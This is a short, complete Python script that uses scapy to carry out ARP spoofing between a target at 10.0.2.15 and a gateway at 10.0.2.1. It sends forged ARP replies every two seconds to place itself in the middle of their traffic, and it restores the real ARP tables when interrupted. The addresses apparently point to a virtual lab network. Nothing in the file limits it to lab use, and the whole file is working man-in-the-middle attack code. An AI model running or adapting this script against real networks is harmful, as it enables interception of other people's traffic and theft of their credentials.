#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        # op=2 is ARP Reply. psrc is the IP we are impersonating.
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    if destination_mac and source_mac:
        # Sending the REAL MAC address (hwsrc) to restore the ARP table
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

# --- Configuration ---
target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"
sent_packets_count = 0

try:
    print(f"[+] Starting ARP Spoofing... Target: {target_ip}")
    while True:
        spoof(target_ip, gateway_ip) 
        spoof(gateway_ip, target_ip) 
        
        sent_packets_count += 2
        # Dynamic output on the same line
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        sys.stdout.flush()
        
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] CTRL+C detected. Restoring ARP tables... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Restoration complete. Quitting.")
